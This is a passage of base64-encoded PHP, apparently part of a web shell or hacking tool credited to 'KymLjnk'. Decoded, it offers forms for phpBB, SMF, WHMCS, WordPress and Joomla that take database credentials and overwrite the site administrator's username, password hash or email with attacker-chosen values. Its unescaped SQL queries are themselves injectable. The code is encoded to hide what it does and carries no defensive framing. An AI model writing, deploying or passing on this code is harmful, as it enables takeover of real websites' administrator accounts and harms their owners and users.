cGhwLCRkYnBwaHApOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5waHApOwoKJHVycGhwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBocCk7CiRzZXRfdXJwaHAgPSAkX1BPU1RbJ3VycGhwJ107CgokcHNwaHA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcGhwKTsKJHBhc3NfcGhwID0gJF9QT1NUWydwc3BocCddOwokc2V0X3BzcGhwID0gbWQ1KCRwYXNzX3BocCk7CgokcGhwX3ByZWZpeCA9ICRfUE9TVFsncHJwaHAnXTsKCiR0YWJsZV9uYW1lMiA9ICRwaHBfcHJlZml4LiJ1c2VycyIgOwoKJGxlY29uZ3RoaWVuNSA9ICJVUERBVEUgJHRhYmxlX25hbWUyIFNFVCB1c2VybmFtZV9jbGVhbiA9JyIuJHNldF91cnBocC4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwokbGVjb25ndGhpZW42ID0gIlVQREFURSAkdGFibGVfbmFtZTIgU0VUIHVzZXJfcGFzc3dvcmQgPSciLiRzZXRfcHNwaHAuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKCiRvazM9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjUpOwokb2szPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW42KTsKCmlmKCRvazMpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdwaHBCQiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1NNRgppZiAoaXNzZXQoJF9QT1NUWydzbWYnXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIFNNRiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2luZGV4LnBocD9hY3Rpb249YWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL1NldHRpbmdzLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXNtZiB0eXBlPXRleHQgbmFtZT1kYm5zbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1c21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5UYWJsZSBwcmVmaXg8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1zbWZfIHR5cGU9dGV4dCBuYW1lPXByc21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHNtZiA9ICRfUE9TVFsnZGJoc21mJ107CiRkYm5zbWYgID0gJF9QT1NUWydkYm5zbWYnXTsKJGRidXNtZiA9ICRfUE9TVFsnZGJ1c21mJ107CiRkYnBzbWYgID0gJF9QT1NUWydkYnBzbWYnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHNtZiwkZGJ1c21mLCRkYnBzbWYpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5zbWYpOwoKJHVyc21mPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnNtZik7CiRzZXRfdXJzbWYgPSAkX1BPU1RbJ3Vyc21mJ107CgokZW1zbWY9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtc21mKTsKJHNldF9lbXNtZiA9ICRfUE9TVFsnZW1zbWYnXTsKCiRzbWZfcHJlZml4ID0gJF9QT1NUWydwcnNtZiddOwoKJHRhYmxlX25hbWUzID0gJHNtZl9wcmVmaXguIm1lbWJlcnMiIDsKCiRsZWNvbmd0aGllbjcgPSAiVVBEQVRFICR0YWJsZV9uYW1lMyBTRVQgbWVtYmVyX25hbWUgPSciLiRzZXRfdXJzbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwokbGVjb25ndGhpZW44ID0gIlVQREFURSAkdGFibGVfbmFtZTMgU0VUIGVtYWlsX2FkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwoKJGxlY29uZ3RoaWVuNyA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBtZW1iZXJOYW1lID0nIi4kc2V0X3Vyc21mLiInIFdIRVJFIElEX01FTUJFUiA9JzEnIjsKJGxlY29uZ3RoaWVuOCA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBlbWFpbEFkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgSURfTUVNQkVSID0nMSciOwoKJG9rND1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuNyk7CiRvazQ9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjgpOwoKaWYoJG9rNCl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1NNRiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1dITUNTCmlmIChpc3NldCgkX1BPU1RbJ3dobWNzJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBXSE1DUyBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluPGJyPlBhdGggQ29uZmlnIDogW3BhdGNoXS9jb25maWd1cmF0aW9uLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmh3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdobWNzIHR5cGU9dGV4dCBuYW1lPWRibndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwd2htIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSB1c2VyIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXRleHQgbmFtZT11cndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdDaGFuZ2UnID48L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsKfWVsc2V7CiRkYmh3aG0gPSAkX1BPU1RbJ2RiaHdobSddOwokZGJud2htICA9ICRfUE9TVFsnZGJud2htJ107CiRkYnV3aG0gPSAkX1BPU1RbJ2RidXdobSddOwokZGJwd2htICA9ICRfUE9TVFsnZGJwd2htJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3aG0sJGRidXdobSwkZGJwd2htKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud2htKTsKCiR1cndobT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJ3aG0pOwokc2V0X3Vyd2htID0gJF9QT1NUWyd1cndobSddOwoKJHBzd2htPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dobSk7CiRwYXNzX3dobSA9ICRfUE9TVFsncHN3aG0nXTsKJHNldF9wc3dobSA9IG1kNSgkcGFzc193aG0pOwoKJGxlY29uZ3RoaWVuOSA9ICJVUERBVEUgdGJsYWRtaW5zIFNFVCB1c2VybmFtZSA9JyIuJHNldF91cndobS4iJyBXSEVSRSBpZCA9JzEnIjsKJGxlY29uZ3RoaWVuMTAgPSAiVVBEQVRFIHRibGFkbWlucyBTRVQgcGFzc3dvcmQgPSciLiRzZXRfcHN3aG0uIicgV0hFUkUgaWQgPScxJyI7Cgokb2s1PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW45KTsKJG9rNT1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTApOwoKaWYoJG9rNSl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1dITUNTIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vV29yZFByZXNzCmlmIChpc3NldCgkX1BPU1RbJ3dvcmRwcmVzcyddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgV29yZFByZXNzIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vd3AtYWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL3dwLWNvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJod3Agc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdvcmRwcmVzcyB0eXBlPXRleHQgbmFtZT1kYm53cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdwXyB0eXBlPXRleHQgbmFtZT1wcndwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHdwID0gJF9QT1NUWydkYmh3cCddOwokZGJud3AgID0gJF9QT1NUWydkYm53cCddOwokZGJ1d3AgPSAkX1BPU1RbJ2RidXdwJ107CiRkYnB3cCAgPSAkX1BPU1RbJ2RicHdwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3cCwkZGJ1d3AsJGRicHdwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud3ApOwoKJHVyd3A9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyd3ApOwokc2V0X3Vyd3AgPSAkX1BPU1RbJ3Vyd3AnXTsKCiRwc3dwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dwKTsKJHBhc3Nfd3AgPSAkX1BPU1RbJ3Bzd3AnXTsKJHNldF9wc3dwID0gbWQ1KCRwYXNzX3dwKTsKCiR3cF9wcmVmaXggPSAkX1BPU1RbJ3Byd3AnXTsKCiR0YWJsZV9uYW1lNCA9ICR3cF9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMSA9ICJVUERBVEUgJHRhYmxlX25hbWU0IFNFVCB1c2VyX2xvZ2luID0nIi4kc2V0X3Vyd3AuIicgV0hFUkUgSUQgPScxJyI7CiRsZWNvbmd0aGllbjEyID0gIlVQREFURSAkdGFibGVfbmFtZTQgU0VUIHVzZXJfcGFzcyA9JyIuJHNldF9wc3dwLiInIFdIRVJFIElEID0nMSciOwoKJG9rNj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTEpOwokb2s2PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xMik7CgppZigkb2s2KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnV29yZFByZXNzIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vSm9vbWxhCmlmIChpc3NldCgkX1BPU1RbJ2pvb21sYSddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgSm9vbWxhIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vYWRtaW5pc3RyYXRvcjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlndXJhdGlvbi5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJoam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1qb29tbGEgdHlwZT10ZXh0IG5hbWU9ZGJuam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidWpvcyBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVyam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWpvc18gdHlwZT10ZXh0IG5hbWU9cHJqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJoam9zID0gJF9QT1NUWydkYmhqb3MnXTsKJGRibmpvcyAgPSAkX1BPU1RbJ2RibmpvcyddOwokZGJ1am9zID0gJF9QT1NUWydkYnVqb3MnXTsKJGRicGpvcyAgPSAkX1BPU1RbJ2RicGpvcyddOwogICAgICAgICBAbXlzcWxfY29ubmVjdCgkZGJoam9zLCRkYnVqb3MsJGRicGpvcyk7CiAgICAgICAgIEBteXNxbF9zZWxlY3RfZGIoJGRibmpvcyk7CgokdXJqb3M9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyam9zKTsKJHNldF91cmpvcyA9ICRfUE9TVFsndXJqb3MnXTsKCiRwc2pvcz1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHNqb3MpOwokcGFzc19qb3MgPSAkX1BPU1RbJ3Bzam9zJ107CiRzZXRfcHNqb3MgPSBtZDUoJHBhc3Nfam9zKTsKCiRqb3NfcHJlZml4ID0gJF9QT1NUWydwcmpvcyddOwoKJHRhYmxlX25hbWU1ID0gJGpvc19wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMyA9ICJVUERBVEUgJHRhYmxlX25hbWU1IFNFVCB1c2VybmFtZSA9JyIuJHNldF91cmpvcy4iJyBXSEVSRSBpZCA9JzYyJyI7CiRsZWNvbmd0aGllbjE0ID0gIlVQREFURSAkdGFibGVfbmFtZTUgU0VUIHBhc3N3b3JkID0nIi4kc2V0X3Bzam9zLiInIFdIRVJFIGlkID0nNjInIjsKCiRvazc9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEzKTsKJG9rNz1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTQpOwoKaWYoJG9rNyl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ0pvb21sYSB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbm